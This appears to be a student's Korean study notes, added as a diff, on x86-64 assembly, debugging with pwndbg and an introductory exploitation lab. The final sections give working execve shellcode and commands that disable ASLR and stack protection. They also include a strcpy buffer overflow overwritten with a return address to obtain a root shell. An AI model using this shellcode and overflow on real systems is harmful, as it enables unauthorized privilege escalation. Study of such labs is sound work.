@@ -1,0 +1,309 @@
+* assembly어로 echo.s 프로그램 만들기*
+>nano echo.s
+
+-section .text
+
+_start:
+	xor  rax, rax ->0으로 초기환  ->systemcall 불러옴 0은 sys_read
+	mov rbx, rax
+	mov rcx, rax
+	mov rdx, rax
+
+	sub  rsp, 64  ->stack에 64bit만큼 공간 확보
+	mov rdi, 0  ->file distruct 0은 sys_read, 1은 sys_wirte 가 들어감
+	mov rsi, rsp  ->rsi 는 char *buf(주소) 시작 주소의 의미
+	mov rdx, 63  ->63개 문자 size_t count 얼마나 읽어 올지 크기 63개의 문자 크기
+
+	syscall  ->systemcall table 참조, dll 블러옴   ------------->입력을 받고
+
+	mov rax, 1 ->sys_write라는 systemcall
+	mov rdi, 1 ->file disk로 systemcall이 들어감 ,쓰는 경우는 1이 들어가소 읽는 것은 0이 들어감
+	mov rsi, rsp  -> rsp는 위치주소로 그곳으로 부터 63만큼
+	mov rdx, 63
+
+	syscall   --------------------> 받은 문자 출력하기
+
+	mov rax, 60 ->60 sys_exit 의 systemcall 프로그램 종료명령 
+	
+	syscall         ---------------------> 종료하기
+
+ctrl+x , y
+
+>nasm -f elf64 -o echo.o echo.s  ->echo.s를 echo.o로 목적 파일 만들기
+>ld -o echo echo.o ->linking 과정을 거처 실행 파일로 만듬
+>./echo -> 실행
+
+----------------------------------------------------------
+
+* assembly어로 hello world 출력 프로그램 만들기*
+
+section .data  ->data 영역 문자 msg변수 만들기
+        msg db "Hello World My eun"
+
+section .text   ->code를 실행시키는 text 영역에서 msg변수 사용함
+        global_start
+
+_start:     --->시작함수
+        mov rax, 1   ->sys_write
+        mov rdi, 1  ->systemcall 입력
+        mov rsi, msg  ->문자변수 입력 pointer 변수
+        mov rdx, 12  ->길이 저장
+        syscall   -->helloworld를 출력하는 systemcall
+        mov rax, 60   -->sys_exit  ->종료함수
+        mov rdi, 0   --> 안전하게 종료
+        syscall  -->program를 종료하는 systemcall
+--------------------------------------------------------------------
+ctrl+x , y
+
+>nasm -f elf64 -o helloworld.o helloworld.s  ->helloworld.s를helloworld.o로 목적 파일 만들기
+>ld -o helloworld helloworld.o ->linking 과정을 거처 실행 파일로 만듬
+>./helloworld -> 실행
+
+
+*rax register ->실질적인 번호, 함수 실행, 결과값이 저장되는 주요 register
+*rbx register ->memory adress 지정, base register
+*rcx register ->counter register 반복문시 사용
+*rdx register ->data register size_ t counter로 rax register와 같이 많이 사용됨	-----------> 여기까지가 data register로 분류
+-------------------------------------
+*pointer register --->매개변수를 저장
+*rsi ->메모리를 이동하거나 비교할때 출발지 주소를 가리킴 char *buf
+*rdi ->   ''                                    그 목적지 주소를 가리킴
+*rbp -> 함수의 파라미터나 변수의 주소를 가리킴
+*rsp -> 삽입 및 삭제시 가장 위에 있는 register를 가리킴
+*r8~r18 -> 함수의 변수 사용
+-----------------------------------------
+*64bit system call table 단어를 검색해서 번호에 따라 확인	(0~332개 함수)
+ ->systemcall 함수는 %rax 에서 kernel 운영체제에서 프로그래머를 위해 기본적으로 미리 저장된 함수 
+	
+
+--------------------------------------------------------
+>nano sum.c
+
+#include <stdio.h>
+
+int sum(int a, int b) {
+        return a + b ;
+}
+
+int main(void) {
+        int c = sum(1, 2);
+        return c;
+}
+
+>ctrl+x, y
+
+>gcc -S -fno-stack-protector -mpreferred-stack-boundary=4 -z execstack -o sum.a sum.c ->c언어 assemnly어로 변환하는 명령어
+>vi sum.a  ->esc : 
+
+
+-----
+linux mv file.c assembly/    ---> 폴더 뒤에 "/"를 붙여야 한다. 
+
+-------------------
+gcc -c   file.c   -> sourse file로 object file 생성
+gcc -o file.out file.o file1.o file2.o  ->object file을 .out 실행 파일로 linking함
+   --> 이것만 해도 실햄됨
+
+>vi Makefile
+>make ->실행명령:
+
+*instruction
+- move : eax, 100 ->100을 eax에 옮겨라
+- lea : eac, [eax + 1000] ->eax에 1000을 넣은 값을 다시 eax에 넣는다
+- jmp : 특정한 위치로 이동
+- call : 함수 호출호 다시 돌아옴
+- nop : 아무 작없도 하지 않는 명령어
+- ret : 함수가 끝난 뒤에 돌아갈 주소를 지정하기 위해 사용
+- push : stack에 해당 값을 넣는다
+- pop : stack 있는 값을 뺀다
+- leave : 실행 중인 함수 종료 
+ 
+---------------------------------------------
+*반복문 예제
+section .data
+        msg db "A"
+
+section .text
+        global _start
+
+_start:
+        mov rax, 1
+        mov rdi, 1
+        mov rsi, msg
+        mov rdx, 1
+        mov r10, 1
+
+again:
+        cmp r10, 100
+        je done
+        syscall
+        mov rax, 1
+        inc r10
+        jmp again
+
+done:
+        mov rax, 60
+        mov rdi, 0
+        syscall
+-----------------------------------------------------
+>apt-get install update
+>apt-get install strace
+>strace -ifx ./echo
+
+>git clone https://github.com/pwndbg/pwndbg
+>cd pwndbg
+>./setup.sh
+>cd..  ->해당폴더로 이동
+>ls
+
+>gdb echo(실행파일)
+  pwndbg>break * _start   ->break
+              >run  ->실행
+              >ni    ->다음 실행
+              >quit  ->종료
+
+-------------------------------------------
+*별만들기
+section .data
+        STAR db '*'
+        EMPTY db 0x0a
+
+section .text
+        global _start
+
+_start:
+        mov rax, 1 ; WIRTE  systemcall setting
+        mov rdi, 1 ; base out mode
+        mov rdx, 1 ; output length  setting
+        mov r10, 0 ;index
+        mov r9, [rsp + 16] ; inputted string finding
+
+        cmp r9, 0 ; If there is no input
+        je _done ; End of program
+
+        mov cl, [r9] ; save just one byte in a cl
+        movzx r9, cl ; save cl in character form to r9
+        sub r9, 0x30 ; index
+
+        mov r8, r9
+        xor r9, r9
+        call _syscall
+
+_small:
+        cmp r10, r9
+        je _up
+        mov rsi, STAR ; output a star
+        syscall ; output
+        mov rax, 1 ; WRITE systemcall setting
+        inc r10  ; Increase j by 1
+        jmp _small  ; output again _samall function
+
+_up:
+        cmp r9, r8 ; If i is equal to n
+        je _down ; Run the function that goes down
+        mov rsi, EMPTY ; changing lines setting
+        syscall ; Run output function
+        mov rax, 1
+        mov r10, 0
+        add r9, 1
+        jmp _small
+
+_down:
+        cmp r9, 0 ; If i is equal to 0
+        je _done
+        mov rsi, EMPTY ; changing lines setting
+        syscall
+        mov rax, 1 ; WRITE systemcall setting
+        mov r10, 0; Initialize j
+        sub r9, 1 ; Decrease i by 1
+        jmp _big ; output again
+
+_big:
+        cmp r10, r9 ; If i is equal to j
+        je _down
+        mov rsi, STAR ; star output setting
+        syscall
+        mov rax, 1
+        inc r10
+        jmp _big
+
+
+
+_done:
+        mov rax, 60 ; End of program
+        mov rdi, 0
+        syscall
+
+_syscall:
+        syscall
+        ret
+
+------------------------------------------------------------------
+>nasm -f elf64 -o pyramid.o pyramid.s
+>ld -o pyramid pyramid.o 
+>./pyramid 7
+
+
+--------------------------------------------
+*shell code
+
+>google >kali linux 64bit shell code 
+
+>nano shell.c
+
+ 
+#include <stdio.h>
+#include <string.h>
+
+char shell[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+void main() {
+        printf("length: %d bytes\n", strlen(shell));
+        (*(void(*)()) shell)();
+        return 0;
+}
+
+---------------------------------------------------
+>gcc -fno-stack-protector -mpreferred-stack-boundary=4  -z execstack shell.c -o shell
+  ->방어기법을 끈상태에서 compile하기
+>cat /etc/passwd
+>adduser savinci
+>chmod 4755 shell  ->setuid 권한변경 : 파일을 root권한으로 변경
+>sudo su savinci
+>savinci@kali:~shell$./shell
+
+--------------------------------------------------
+*buffer overflow
+
+#include <stdio.h>
+
+int main(int argc, char * argv[]) {
+  char buf[16];
+  if(argc != 2)
+    return -1;
+  strcpy(buf, argv[1]);
+  return 0;
+}
+----------------------------------------------
+>gcc -o overflow overflow.c
+>gdb overflow
+  pwndbg>run `perl -e 'print "X" x 24, "S" x 8'`
+  pwndbg>break * main
+  pwndbg>run `perl -e 'print "X" x 24, "S" x 8'`
+  pwndbg>ni  ->1씩 실행
+  pwndbg>quit
+
+>sysctl -w kernel.randomize_va_space=0 ->linux 보안기능을 다꺼줌
+>ldd ./overflow
+
+>export SHELLCODE=`perl -e 'print "\x90" x 2000, "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
+  ->환경변수에 직접 shell을 만든다
+>gdb ./overflow
+ pwndbg>break * main
+ pwndbg>run
+ pwndbg>x/100a $rsp
+ pwndbg>quit
+
+>gcc -fno-stack-protector -mpreferred-stack-boundary=4  -z execstack overflow.c -o overflow
+>./overflow `perl -e 'print "X" x 24, "\x88\xef\xff\xff\xff\x7f"'`  -> 주소는 역순으로 입력
+># root 권한으로 변경
